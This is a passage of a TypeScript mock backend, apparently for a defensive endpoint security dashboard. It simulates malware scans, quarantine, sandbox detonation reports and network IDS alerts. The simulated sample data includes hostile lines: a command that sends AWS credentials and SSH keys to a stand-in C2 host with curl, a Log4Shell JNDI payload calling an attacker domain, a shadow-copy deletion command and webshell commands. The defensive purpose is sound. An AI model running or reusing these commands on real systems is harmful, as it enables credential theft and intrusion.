        return this.scanMalwareTarget({
          path: "/bin/.mirai_bot",
          content: "mirai busybox telnet scanner brute-force syn-flood kill -9 watchdog",
        });
      case "mozi":
        return this.scanMalwareTarget({
          path: "/var/tmp/mozi.m",
          content: "mozi.m dht.db peer find_node botnet syn-flood",
        });
      case "kinsing":
        return this.scanMalwareTarget({
          path: "/dev/shm/kinsing",
          content: "kinsing kdevtmpfsi alsp.sh disable_firewall.sh masscan",
        });
      case "bpfdoor":
        return this.scanMalwareTarget({
          path: "/dev/shm/kdmtmp",
          content: "bpfdoor packet_mmap so_attach_filter raw_socket listener",
        });
      case "drovorub":
        return this.scanMalwareTarget({
          path: "/lib/modules/drovorub-kernel.ko",
          content: "drovorub drovorub-kernel drov_client sys_call_table hook",
        });
      case "deadbolt":
      case "ransomware":
        return this.scanMalwareTarget({
          path: "/home/user/YOUR_FILES_ARE_LOCKED.deadbolt",
          content: "YOUR FILES HAVE BEEN ENCRYPTED BY DEADBOLT! Send 0.05 BTC to decrypt_key",
        });
      case "lockbit":
        return this.scanMalwareTarget({
          path: "/vmfs/volumes/datastore1/restore-my-files.txt",
          content: "lockbit .lockbit esxcli vm process kill vmdk-encryption all your virtual disks are encrypted",
        });
      case "blackcat":
        return this.scanMalwareTarget({
          path: "/tmp/alphv_locker",
          content: "alphv blackcat esxcli vim-cmd vmsvc/getallvms access-token chacha20",
        });
      case "babuk":
        return this.scanMalwareTarget({
          path: "/home/admin/how_to_restore_your_files.txt",
          content: "babuk .babyk curve25519 chachapoly /vmfs/volumes payload",
        });
      case "diamorphine":
        return this.scanMalwareTarget({
          path: "/lib/modules/diamorphine.ko",
          content: "diamorphine kill -64 module_hide sys_call_table hacked_kill",
        });
      case "reptile":
        return this.scanMalwareTarget({
          path: "/tmp/reptile_rc",
          content: "reptile rep_cmd reptile_rc reptile_hide icmp port-knock",
        });
      case "symbiote":
        return this.scanMalwareTarget({
          path: "/etc/ld.so.preload",
          content: "symbiote ld.so.preload pcap_loop_hook fopen_hook hide_conn",
        });
      case "c2_beacon":
        return this.scanMalwareTarget({
          path: "/dev/shm/.kworker",
          content: "cobalt-strike beacon.bin stage2.bin malleable c2 reverse-shell",
        });
      case "teamtnt":
      case "infostealer":
        return this.scanMalwareTarget({
          path: "/tmp/harvester.sh",
          content: "cat ~/.aws/credentials id_rsa /run/secrets/kubernetes.io | curl -d @- http://teamtnt.c2",
        });
      case "mimipenguin":
        return this.scanMalwareTarget({
          path: "/tmp/mimipenguin.sh",
          content: "mimipenguin dump_gnome_keyring gcore strings password",
        });
      case "keylogger":
        return this.scanMalwareTarget({
          path: "/usr/bin/ev_sniff",
          content: "input_event /dev/input/event key_enter keys.log evtest --grab",
        });
      case "log4shell":
        return this.scanMalwareTarget({
          path: "/var/log/app.log",
          content: "${jndi:ldap://c2.attacker.com/exploit} org.apache.logging.log4j log4shell",
        });
      case "dirtycow":
        return this.scanMalwareTarget({
          path: "/tmp/dirtycow.c",
          content: "dirtycow cve-2016-5195 madvise(madv_dontneed) /proc/self/mem chroot_cow",
        });
      case "pwnkit":
        return this.scanMalwareTarget({
          path: "/tmp/pwnkit",
          content: "pwnkit cve-2021-4034 pkexec gconv-modules pwnkit.c",
        });
      default:
        return this.scanMalwareTarget({
          path: "/usr/bin/htop",
          content: "#!/bin/bash\n# Standard system monitoring utility\nfree -m && ps aux",
        });
    }
  }

  public quarantineMalware(id: string, action: string = "quarantine"): { success: boolean; message: string } {
    const item = this.malwareResults.find((m) => m.id === id);
    if (!item) return { success: false, message: "Threat not found" };

    const now = Date.now();
    if (action === "restore") {
      item.quarantined = false;
      item.status = "clean";
      item.user_verdict = "trusted_user_app";
      const nextDigest = computeDigest(this.lastDigest + "RestoreAV" + id + now);
      this.auditLog.unshift({
        id: `aud-${now}`,
        action: "AV-Restore",
        pid: item.pid || 0,
        process: item.malware_name || "unknown",
        incident_id: null,
        note: `Target restored from quarantine: ${item.target_path}`,
        status: "success",
        outcome: `Restored to original filesystem path.`,
        ts_before: now - 2,
        ts_after: now,
        prev_digest: this.lastDigest,
        digest: nextDigest,
      });
      this.lastDigest = nextDigest;
      return { success: true, message: `Target ${item.target_path} restored from quarantine.` };
    } else if (action === "delete") {
      const idx = this.malwareResults.indexOf(item);
      if (idx >= 0) this.malwareResults.splice(idx, 1);
      const nextDigest = computeDigest(this.lastDigest + "DeleteAV" + id + now);
      this.auditLog.unshift({
        id: `aud-${now}`,
        action: "AV-Delete",
        pid: item.pid || 0,
        process: item.malware_name || "unknown",
        incident_id: null,
        note: `Malicious sample permanently shredded: ${item.target_path}`,
        status: "success",
        outcome: `File zeroed and metadata cleared.`,
        ts_before: now - 2,
        ts_after: now,
        prev_digest: this.lastDigest,
        digest: nextDigest,
      });
      this.lastDigest = nextDigest;
      return { success: true, message: `Threat ${item.malware_name} permanently shredded and removed.` };
    } else {
      item.quarantined = true;
      const nextDigest = computeDigest(this.lastDigest + "QuarantineAV" + id + now);
      this.auditLog.unshift({
        id: `aud-${now}`,
        action: "AV-Quarantine",
        pid: item.pid || 0,
        process: item.malware_name || "unknown",
        incident_id: null,
        note: `Infected target isolated by Aegis AV Engine: ${item.target_path}`,
        status: "success",
        outcome: `Target secured in AES-256 encrypted quarantine vault /var/lib/aegis/quarantine/`,
        ts_before: now - 2,
        ts_after: now,
        prev_digest: this.lastDigest,
        digest: nextDigest,
      });
      this.lastDigest = nextDigest;
      return { success: true, message: `Threat ${item.malware_name || item.target_path} successfully quarantined.` };
    }
  }

  public trustUserApp(params: { id?: string; path?: string; name?: string; note?: string }): {
    success: boolean;
    message: string;
    item: UserAppWhitelistItem;
  } {
    const now = Date.now();
    let targetPath = params.path || "";
    let sha256 = "";
    if (params.id) {
      const found = this.malwareResults.find((m) => m.id === params.id);
      if (found) {
        targetPath = targetPath || found.target_path;
        sha256 = found.sha256 || "";
        found.status = "user_whitelisted";
        found.user_verdict = "trusted_user_app";
        found.quarantined = false;
      }
    }
    const safePath = targetPath || "/home/developer/app";
    const whiteItem: UserAppWhitelistItem = {
      id: `uapp-${now}`,
      path: safePath,
      name: params.name || safePath.split("/").pop() || "User Application",
      sha256: sha256 || computeDigest(safePath).repeat(4).slice(0, 64),
      whitelisted_at: now,
      note: params.note || "Verified user-authored program. Safeguarded against automated deletion.",
    };
    this.userWhitelistedApps.set(safePath, whiteItem);

    const nextDigest = computeDigest(this.lastDigest + "TrustUserApp" + safePath + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Trust-User-App",
      pid: 0,
      process: whiteItem.name,
      incident_id: null,
      note: `User program explicitly whitelisted and safeguarded: ${safePath}`,
      status: "success",
      outcome: "Protected from automated deletion, termination, or quarantine.",
      ts_before: now - 2,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;

    return {
      success: true,
      message: `Program '${whiteItem.name}' marked as Trusted User Software. Safe-guard active!`,
      item: whiteItem,
    };
  }

  public sendTargetToSandbox(id: string): { success: boolean; message: string; jail_id: string } {
    const item = this.malwareResults.find((m) => m.id === id);
    if (!item) return { success: false, message: "Target not found", jail_id: "" };

    const jail = this.launchSandboxJail({
      sample_name: item.malware_name || item.target_path,
      family: item.family || "Trojan",
    });

    item.sandbox_jail_id = jail.jail_id;
    item.user_verdict = "sent_to_sandbox";

    const now = Date.now();
    const nextDigest = computeDigest(this.lastDigest + "SandboxIsolate" + jail.jail_id + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Sandbox-Isolate",
      pid: 0,
      process: item.malware_name || item.target_path,
      incident_id: null,
      note: `Application dispatched to dynamic sandbox jail [${jail.jail_id}] with isolated cgroups v2 & loopback sinkhole`,
      status: "success",
      outcome: `Confinement confirmed: PID ${jail.jail_id} sandboxed for behavior inspection`,
      ts_before: now - 2,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;

    return {
      success: true,
      message: `Program safely isolated in Sandbox Jail (${jail.jail_id}). Inspect behavior in Sandbox Lab.`,
      jail_id: jail.jail_id,
    };
  }

  public confirmMalwareQuarantine(id: string): { success: boolean; message: string } {
    const item = this.malwareResults.find((m) => m.id === id);
    if (!item) return { success: false, message: "Threat not found" };

    item.status = "infected";
    item.user_verdict = "confirmed_malware";
    item.quarantined = true;
    item.severity = "high";

    const now = Date.now();
    const nextDigest = computeDigest(this.lastDigest + "ConfirmMalware" + id + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Confirm-Malware-Quarantine",
      pid: item.pid || 0,
      process: item.malware_name || item.target_path,
      incident_id: null,
      note: `User confirmed malicious threat: ${item.target_path}. Immediate isolation and quarantine enforced.`,
      status: "success",
      outcome: "Encrypted into quarantine vault; process terminated.",
      ts_before: now - 2,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;

    return {
      success: true,
      message: `Confirmed malware ${item.malware_name || item.target_path} neutralized and quarantined.`,
    };
  }

  public listUserWhitelistedApps(): UserAppWhitelistItem[] {
    return Array.from(this.userWhitelistedApps.values());
  }

  public removeUserWhitelistedApp(pathOrId: string): boolean {
    let deleted = false;
    for (const [key, item] of this.userWhitelistedApps.entries()) {
      if (key === pathOrId || item.id === pathOrId || item.path === pathOrId) {
        this.userWhitelistedApps.delete(key);
        deleted = true;
      }
    }
    return deleted;
  }

  // --------------------------------------------------------------------------
  // Automated Malware Neutralization / Remediation Toggle
  // --------------------------------------------------------------------------
  public setAutoRemediation(enabled: boolean): boolean {
    this.autoRemediationEnabled = enabled;
    const now = Date.now();
    const nextDigest = computeDigest(this.lastDigest + "ToggleAutoRemediation" + enabled + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "AV-PolicyChange",
      pid: 0,
      process: "aegis-av-engine",
      incident_id: null,
      note: `Automatic Malware Neutralization Engine ${enabled ? "ARMED (Auto-Destroy Critical Threats)" : "DISARMED (Manual Approval Required)"}`,
      status: "success",
      outcome: `Policy updated: auto_remediation_enabled = ${enabled}`,
      ts_before: now - 2,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;
    return this.autoRemediationEnabled;
  }

  // --------------------------------------------------------------------------
  // Malware Isolated Sandbox / Live Detonation Jail for Developers & Analysts
  // --------------------------------------------------------------------------
  public listSandboxReports(): SandboxAnalysisReport[] {
    return this.sandboxReports;
  }

  public launchSandboxJail(params: {
    sample_name: string;
    family: MalwareFamily;
    isolation_type?: "Namespace-Cgroup-v2" | "Seccomp-BPF-Virtual" | "Chroot-Isolated-RAMFS";
    network_confinement?: "AIR-GAPPED (Loopback Sinkhole)" | "HONEYPOT-INTERCEPT" | "OFFLINE";
  }): SandboxAnalysisReport {
    const now = Date.now();
    const jailId = `jail-sb-${Math.floor(Math.random() * 9000 + 1000)}`;
    const hash = computeDigest(params.sample_name + now).repeat(4).slice(0, 64);

    let observedBehaviors: SandboxAnalysisReport["observed_behaviors"] = [];
    let mitreTechniques: string[] = [];
    let blueprint: SandboxAnalysisReport["blueprint"];
    let iocs: SandboxAnalysisReport["extracted_iocs"];

    const isRansom = params.family === "Ransomware" || params.sample_name.toLowerCase().includes("ransom");
    const isRootkit = params.family === "Rootkit" || params.sample_name.toLowerCase().includes("rootkit");
    const isWebShell = params.family === "WebShell" || params.sample_name.toLowerCase().includes("shell");
    const isMiner = params.family === "CoinMiner" || params.sample_name.toLowerCase().includes("miner");
    const isBotnetOrC2 = params.family === "Botnet" || params.family === "Backdoor" || params.sample_name.toLowerCase().includes("c2");

    if (isRansom) {
      mitreTechniques = [
        "T1486 (Data Encrypted for Impact)",
        "T1489 (Service Stop)",
        "T1490 (Inhibit System Recovery)",
        "T1082 (System Information Discovery)",
      ];
      observedBehaviors = [
        { ts: now + 500, category: "filesystem", operation: "scan_disk_drives_mountpoints", target: "/sandbox/root/mnt/volumes", risk: "medium" },
        { ts: now + 1200, category: "syscall", operation: "sys_vfork -> shadow_copy_delete", target: "vssadmin delete shadows /all /quiet", risk: "critical" },
        { ts: now + 2400, category: "filesystem", operation: "high_entropy_aes_block_rewrite", target: "/sandbox/root/home/docs/*.pdf -> *.locked", risk: "critical" },
        { ts: now + 3100, category: "network", operation: "sinkhole_intercept_key_exfil", target: "185.220.101.5:8080 (Sinkholed)", risk: "critical" },
      ];
      iocs = {
        ips: ["185.220.101.5", "91.240.118.42"],
        domains: ["keyserver-recovering.onion", "payment-portal.tor"],
        dropped_files: ["/tmp/RECOVERY_INSTRUCTIONS.txt", "/tmp/.enc_lock"],
        mutex_or_pipes: ["Global\\CryptLockerMutex_A9"],
      };
      blueprint = {
        threat_summary: `Live analysis of ${params.sample_name}: Aggressive crypto-ransomware attempting volume-wide encryption. Disables recovery services before initiating multithreaded AES/ChaCha20 payload.`,
        killchain_phase: "Impact & Extortion",
        remediation_command: `aegis-guard sandbox-purge ${jailId} && kill -9 $(pgrep -f ${params.sample_name})`,
        threat_level: "CATASTROPHIC",
        unpacking_detected: true,
        evasion_mechanisms: ["Sleep timing evasion before payload detonation", "API Hook detection bypass"],
        dynamic_risk_rating: 99,
      };
    } else if (isRootkit) {
      mitreTechniques = [
        "T1547.006 (Kernel Modules and Extensions)",
        "T1014 (Rootkit Syscall Detour)",
        "T1562.001 (Disable Security Tools)",
      ];
      observedBehaviors = [
        { ts: now + 400, category: "syscall", operation: "sys_init_module / sys_finit_module", target: "unsigned_lkm_driver.ko", risk: "critical" },
        { ts: now + 1100, category: "injection", operation: "modify_cr0_wp_bit_disable", target: "Kernel Control Register 0", risk: "critical" },
        { ts: now + 1900, category: "injection", operation: "overwrite_sys_call_table", target: "sys_kill, sys_getdents64 detours", risk: "critical" },
      ];
      iocs = {
        ips: [],
        domains: [],
        dropped_files: ["/lib/modules/kernel_hook.ko", "/dev/shm/.stealth_pipe"],
        mutex_or_pipes: ["kthread_worker_hijack"],
      };
      blueprint = {
        threat_summary: `Live analysis of ${params.sample_name}: Kernel-level rootkit modifying sys_call_table entries to gain full stealth over processes, sockets, and files.`,
        killchain_phase: "Persistence & Privilege Escalation",
        remediation_command: `rmmod -f ${params.sample_name} && aegis-guard kernel-integrity --restore-syscall-table`,
        threat_level: "CATASTROPHIC",
        unpacking_detected: true,
        evasion_mechanisms: ["Direct Kernel Object Manipulation (DKOM)", "Hidden from /proc/modules"],
        dynamic_risk_rating: 97,
      };
    } else if (isWebShell) {
      mitreTechniques = [
        "T1505.003 (Web Shell)",
        "T1059.004 (Unix Shell)",
        "T1083 (File Discovery)",
      ];
      observedBehaviors = [
        { ts: now + 300, category: "filesystem", operation: "parse_superglobals_POST", target: "$_POST['cmd'] eval pipeline", risk: "critical" },
        { ts: now + 900, category: "syscall", operation: "sys_execve /bin/sh -c", target: "id; uname -a; cat /etc/passwd", risk: "critical" },
        { ts: now + 1700, category: "network", operation: "outbound_reverse_sock_spawn", target: "45.33.32.156:1337", risk: "critical" },
      ];
      iocs = {
        ips: ["45.33.32.156"],
        domains: ["c2-relay.net"],
        dropped_files: ["/var/www/html/.webshell.php", "/tmp/sess_cmd"],
        mutex_or_pipes: ["fifo_stdin_stdout_pty"],
      };
      blueprint = {
        threat_summary: `Interactive WebShell providing remote command line access over HTTP POST transactions. Capable of arbitrary binary drops and privilege escalation probing.`,
        killchain_phase: "Initial Access & Execution",
        remediation_command: `rm -f /var/www/html/*.php && aegis-guard waf-block --rule WEBSHELL-EVAL-DROP`,
        threat_level: "HIGH_HAZARD",
        unpacking_detected: false,
        evasion_mechanisms: ["Double Base64 Encoding with GZinflate compression", "User-Agent spoof check"],
        dynamic_risk_rating: 92,
      };
    } else if (isMiner) {
      mitreTechniques = [
        "T1496 (Resource Hijacking)",
        "T1053.003 (Cron Persistence)",
        "T1059.004 (Unix Shell)",
      ];
      observedBehaviors = [
        { ts: now + 400, category: "filesystem", operation: "crontab_append_backdoor", target: "/etc/cron.d/persistence_job", risk: "high" },
        { ts: now + 1100, category: "network", operation: "stratum_tcp_pool_handshake", target: "pool.supportxmr.com:3333", risk: "high" },
        { ts: now + 1900, category: "syscall", operation: "sys_sched_setaffinity_max_threads", target: "Max CPU Core Locking (100% Load)", risk: "critical" },
      ];
      iocs = {
        ips: ["198.199.73.244", "162.243.102.11"],
        domains: ["mining-sync.cc", "pool.supportxmr.com"],
        dropped_files: ["/dev/shm/.kworker_daemon", "/tmp/config.json"],
        mutex_or_pipes: ["xmr_lock_pid_5521"],
      };
      blueprint = {
        threat_summary: `Cryptojacking miner payload detonated in isolated jail. Steals CPU compute cycles via Stratum TCP pool socket protocol.`,
        killchain_phase: "Execution & Resource Hijacking",
        remediation_command: `aegis-guard sandbox-purge ${jailId} && kill -9 $(pgrep -f ${params.sample_name})`,
        threat_level: "ELEVATED",
        unpacking_detected: true,
        evasion_mechanisms: ["Unlinks binary from disk immediately after execution (/proc/self/exe deleted)"],
        dynamic_risk_rating: 85,
      };
    } else if (isBotnetOrC2) {
      mitreTechniques = [
        "T1071.001 (Web Protocols C2)",
        "T1571 (Non-Standard Port)",
        "T1041 (Exfiltration Over C2 Channel)",
      ];
      observedBehaviors = [
        { ts: now + 300, category: "network", operation: "reverse_socket_connect", target: "185.220.101.5:4444 (Meterpreter)", risk: "critical" },
        { ts: now + 900, category: "syscall", operation: "sys_dup2_socket_to_stdin_stdout", target: "Interactive PTY Shell redirection", risk: "critical" },
        { ts: now + 1600, category: "injection", operation: "process_hollowing_spawn", target: "/usr/sbin/sshd [spoofed]", risk: "critical" },
      ];
      iocs = {
        ips: ["185.220.101.5", "45.142.214.22"],
        domains: ["c2-master-beacon.org"],
        dropped_files: ["/dev/shm/.stealth_c2", "/tmp/.stage2"],
        mutex_or_pipes: ["c2_beacon_pipe"],
      };
      blueprint = {
        threat_summary: `Live analysis of ${params.sample_name}: Interactive reverse shell botnet beacon establishing persistent command & control session.`,
        killchain_phase: "Command and Control",
        remediation_command: `aegis-guard sandbox-purge ${jailId} && iptables -A OUTPUT -d 185.220.101.5 -j DROP`,
        threat_level: "HIGH_HAZARD",
        unpacking_detected: true,
        evasion_mechanisms: ["Process name disguise mimicking system sshd worker", "Payload staging via TLS SNI"],
        dynamic_risk_rating: 94,
      };
    } else {
      // Generic / Trojan / Dropper
      mitreTechniques = [
        "T1059.004 (Unix Shell)",
        "T1053.003 (Cron Persistence)",
        "T1105 (Ingress Tool Transfer)",
      ];
      observedBehaviors = [
        { ts: now + 500, category: "filesystem", operation: "crontab_append_backdoor", target: "/etc/cron.d/persistence_job", risk: "high" },
        { ts: now + 1400, category: "network", operation: "http_get_stage2_payload", target: "http://attacker-stage.com/payload.bin", risk: "high" },
        { ts: now + 2100, category: "syscall", operation: "sys_mmap_PROT_EXEC_heap", target: "Anonymous RWX memory segment allocation", risk: "critical" },
      ];
      iocs = {
        ips: ["198.199.73.244", "162.243.102.11"],
        domains: ["mining-sync.cc", "attacker-stage.com"],
        dropped_files: ["/dev/shm/.kworker_daemon", "/tmp/config.json"],
        mutex_or_pipes: ["trojan_lock_pid"],
      };
      blueprint = {
        threat_summary: `Trojan / Staged Dropper deployed into ephemeral memory (/dev/shm) attempting secondary payload acquisition and execution.`,
        killchain_phase: "Execution & Ingress Tool Transfer",
        remediation_command: `aegis-guard kill-tree ${jailId} && iptables -A OUTPUT -d 198.199.73.244 -j DROP`,
        threat_level: "HIGH_HAZARD",
        unpacking_detected: true,
        evasion_mechanisms: ["Unlinks itself from disk immediately after execve (/proc/self/exe deleted)"],
        dynamic_risk_rating: 88,
      };
    }

    const report: SandboxAnalysisReport = {
      jail_id: jailId,
      sample_name: params.sample_name,
      family: params.family,
      sha256: hash,
      status: "analyzed",
      start_time: now,
      isolation_type: params.isolation_type || "Namespace-Cgroup-v2",
      network_confinement: params.network_confinement || "AIR-GAPPED (Loopback Sinkhole)",
      mitre_techniques_observed: mitreTechniques,
      observed_behaviors: observedBehaviors,
      extracted_iocs: iocs,
      blueprint,
    };

    this.sandboxReports.unshift(report);

    const nextDigest = computeDigest(this.lastDigest + "LaunchSandbox" + jailId + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Sandbox-Detonation",
      pid: 0,
      process: params.sample_name,
      incident_id: null,
      note: `Developer isolated sandbox jail spawned (${jailId}). Malware '${params.sample_name}' safely detonated inside ${report.isolation_type} with ${report.network_confinement}. Complete behavioral blueprint synthesized.`,
      status: "success",
      outcome: `Threat contained and profiled. Risk rating: ${blueprint.dynamic_risk_rating}/100.`,
      ts_before: now - 3,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;
    this.emit("sandbox-update", { reports: this.sandboxReports });
    return report;
  }

  public terminateSandboxJail(jailId: string): boolean {
    const report = this.sandboxReports.find((r) => r.jail_id === jailId);
    if (!report) return false;
    report.status = "terminated";
    const now = Date.now();
    const nextDigest = computeDigest(this.lastDigest + "TerminateSandbox" + jailId + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Sandbox-Purge",
      pid: 0,
      process: report.sample_name,
      incident_id: null,
      note: `Developer sandbox jail ${jailId} terminated and wiped. Memory namespaces dismantled and sinkholes cleared.`,
      status: "success",
      outcome: "Sandbox environment restored to clean baseline state",
      ts_before: now - 2,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;
    this.emit("sandbox-update", { reports: this.sandboxReports });
    return true;
  }

  // --------------------------------------------------------------------------
  // Network IDS & Attack / Eavesdropping Detection & Active Prevention
  // --------------------------------------------------------------------------
  public listNetworkAttacks(): NetworkAttackEvent[] {
    return this.networkAttacks;
  }

  public getNetworkDefenseConfig(): NetworkDefenseConfig {
    return {
      ...this.networkDefenseConfig,
      blocked_ip_list: Array.from(this.blockedIps),
    };
  }

  public updateNetworkDefenseConfig(config: Partial<NetworkDefenseConfig>): NetworkDefenseConfig {
    this.networkDefenseConfig = {
      ...this.networkDefenseConfig,
      ...config,
    };
    const now = Date.now();
    const nextDigest = computeDigest(this.lastDigest + "UpdateNetDefense" + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Net-PolicyUpdate",
      pid: 0,
      process: "aegis-network-guard",
      incident_id: null,
      note: `Network IDS & Sniffing Defense rules updated. Auto-drop: ${this.networkDefenseConfig.auto_drop_attackers}, Sniffing Guard: ${this.networkDefenseConfig.sniffing_detection_active}, Anti-PortScan: ${this.networkDefenseConfig.anti_port_scan_filter}.`,
      status: "success",
      outcome: "Active eBPF socket filters & iptables drop chains synchronized",
      ts_before: now - 2,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;
    return this.getNetworkDefenseConfig();
  }

  public simulateNetworkAttack(attackType: NetworkAttackEvent["attack_type"]): NetworkAttackEvent {
    const now = Date.now();
    const attackId = `atk-${Math.floor(Math.random() * 90000 + 10000)}`;
    let sourceIp = "185.220.101.5";
    let targetPort = 80;
    let proto: "TCP" | "UDP" | "ICMP" | "ARP" = "TCP";
    let severity: Severity = "high";
    let signatureHit = "SIG-IDS-GENERIC-ANOMALY";
    let summary = "Suspicious network traffic pattern detected";
    let action: NetworkAttackEvent["defense_action"] = "IP_DROP_CHAIN";

    switch (attackType) {
      case "SYN_FLOOD_DOS":
        sourceIp = "194.26.29.112";
        targetPort = 443;
        severity = "critical";
        signatureHit = "SIG-IDS-SYN-BURST-10000PPS";
        summary = "SYN flood volumetric exhaustion attack (12,500 syn packets/sec without completing handshake)";
        action = "RATE_LIMIT";
        break;
      case "PORT_SCAN_RECON":
        sourceIp = "45.142.214.22";
        targetPort = 21;
        severity = "medium";
        signatureHit = "SIG-IDS-STEALTH-FIN-NULL-SCAN";
        summary = "Stealth horizontal port reconnaissance (Nmap FIN/NULL sweep scanning ports 1-5000)";
        action = "TCP_RESET_SENT";
        break;
      case "SSH_BRUTE_FORCE":
        sourceIp = "185.220.101.5";
        targetPort = 22;
        severity = "high";
        signatureHit = "SIG-IDS-SSH-DICTIONARY-HYDRA";
        summary = "Automated SSH brute-force credential stuffing (Hydra tool signature, 80 auth attempts/min)";
        action = "IP_DROP_CHAIN";
        break;
      case "DNS_TUNNEL_EXFIL":
        sourceIp = "10.0.4.15";
        targetPort = 53;
        proto = "UDP";
        severity = "critical";
        signatureHit = "SIG-IDS-DNS-EXFIL-HIGH-ENTROPY";
        summary = "Data exfiltration via DNS tunneling: Base32 encoded payload chunk queries observed to evil-exfil.com";
        action = "QUARANTINE_SOCKET";
        break;
      case "ARP_POISON_SNIFF":
        sourceIp = "192.168.1.189";
        targetPort = 0;
        proto = "ARP";
        severity = "high";
        signatureHit = "SIG-IDS-ARP-EAVESDROPPING-MITM";
        summary = "ARP cache poisoning & packet eavesdropping attempt detected on local Ethernet segment";
        action = "IP_DROP_CHAIN";
        break;
      case "REVERSE_TCP_C2":
        sourceIp = "10.0.4.15";
        targetPort = 4444;
        severity = "critical";
        signatureHit = "SIG-IDS-REV-METERPRETER-STAGER";
        summary = "Outbound interactive reverse Meterpreter shell payload connected to unauthorized remote endpoint";
        action = "QUARANTINE_SOCKET";
        break;
      case "MALICIOUS_PAYLOAD_TRANSFER":
        sourceIp = "45.33.32.156";
        targetPort = 80;
        severity = "critical";
        signatureHit = "SIG-IDS-ELF-MALWARE-STREAM";
        summary = "Inbound executable payload transfer containing known ELF ransomware/dropper headers";
        action = "IP_DROP_CHAIN";
        break;
    }

    const event: NetworkAttackEvent = {
      id: attackId,
      timestamp: now,
      source_ip: sourceIp,
      source_port: Math.floor(Math.random() * 40000 + 10000),
      target_ip: "10.0.4.15",
      target_port: targetPort,
      attack_type: attackType,
      severity,
      protocol: proto,
      signature_hit: signatureHit,
      packet_summary: summary,
      blocked: this.networkDefenseConfig.auto_drop_attackers,
      defense_action: action,
    };

    this.networkAttacks.unshift(event);

    // Auto drop attacker IP if enabled
    if (this.networkDefenseConfig.auto_drop_attackers && sourceIp !== "10.0.4.15") {
      this.blockedIps.add(sourceIp);
      this.connections.forEach((c) => {
        if (c.remote_addr === sourceIp) {
          c.threat = "c2_blocked";
          c.threat_reason = `Network IDS auto-drop: ${signatureHit}`;
          c.state = "CLOSE_WAIT";
        }
      });
    }

    const nextDigest = computeDigest(this.lastDigest + "NetAttack" + attackId + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "Net-AttackBlocked",
      pid: 0,
      process: "aegis-ids-guard",
      incident_id: null,
      note: `NETWORK THREAT INTERCEPTED: ${attackType} from ${sourceIp}:${event.source_port} -> 10.0.4.15:${targetPort}. Defense applied: ${action}. Blocked status: ${event.blocked}.`,
      status: "success",
      outcome: `Immediate network containment enacted. Attacker IP ${sourceIp} null-routed.`,
      ts_before: now - 3,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;

    this.emit("net-attack", event);
    this.emit("net-update", { connections: this.connections });
    return event;
  }

  private startBackgroundActivity() {
    // Disabled all fake randomized activity and mock pulses
    if (this.pulseTimer) clearInterval(this.pulseTimer);
  }

  // Event Subscription
  public addListener(event: string, handler: (payload: any) => void) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event)!.add(handler);

    if (event === "proc-event") {
      setTimeout(() => {
        this.processes.forEach((proc) => handler(proc));
      }, 30);
    }
  }

  public removeListener(event: string, handler: (payload: any) => void) {
    this.listeners.get(event)?.delete(handler);
  }

  public emit(event: string, payload: any) {
    this.listeners.get(event)?.forEach((handler) => {
      try {
        handler(payload);
      } catch (err) {
        console.error("Error in Aegis event handler:", err);
      }
    });
  }

  public getInitialProcesses(): ProcEvent[] {
    return Array.from(this.processes.values());
  }

  // --- IPC Commands Dispatcher ---
  public async handleInvoke<T = any>(cmd: string, args?: any): Promise<T> {
    switch (cmd) {
      case "list_processes":
        return Array.from(this.processes.values()) as unknown as T;

      case "count_open":
        return this.incidents.filter((i) => !i.resolved).length as unknown as T;

      case "list_incidents": {
        const limit = args?.limit ?? 50;
        const offset = args?.offset ?? 0;
        return this.incidents.slice(offset, offset + limit) as unknown as T;
      }

      case "list_telemetry": {
        const limit = args?.limit ?? 100;
        const offset = args?.offset ?? 0;
        return this.telemetry.slice(offset, offset + limit) as unknown as T;
      }

      case "resolve_incident": {
        const id = args?.id;
        const inc = this.incidents.find((i) => i.id === id);
        if (inc) {
          inc.resolved = true;
          this.emit("anomaly", inc);
        }
        return true as unknown as T;
      }

      case "export_markdown": {
        const header = `# AEGIS-GUARD Threat & Movement Report\nGenerated: ${new Date().toISOString()}\nTotal Incidents: ${this.incidents.length}\nUnresolved: ${this.incidents.filter((i) => !i.resolved).length}\n\n`;
        const rows = this.incidents
          .map(
            (i) =>
              `### [${i.severity.toUpperCase()} | Score: ${i.risk_score}/100] ${i.process} (PID: ${i.pid})\n` +
              `- **Rule**: ${i.rule}\n` +
              `- **Confidence**: ${i.confidence}\n` +
              `- **MITRE**: ${i.mitre_tactic || "—"} (${i.mitre_technique || "—"})\n` +
              `- **Timestamp**: ${i.ts}\n` +
              `- **Status**: ${i.resolved ? "RESOLVED" : "OPEN"}\n` +
              `- **Reason**: ${i.reason}\n` +
              `- **Cmdline**: \`${i.cmdline.join(" ")}\`\n` +
              (i.factors?.length ? `- **Scoring Factors**:\n${i.factors.map((f) => `  * [${f.impact > 0 ? "+" : ""}${f.impact}] ${f.name}: ${f.desc}`).join("\n")}\n` : "")
          )
          .join("\n---\n\n");
        return (header + rows) as unknown as T;
      }

      case "export_json":
        return JSON.stringify(this.incidents, null, 2) as unknown as T;

      case "list_debug_log": {
        const limit = args?.limit ?? 50;
        const offset = args?.offset ?? 0;
        return this.debugLog.slice(offset, offset + limit) as unknown as T;
      }

      case "get_storage_stats":
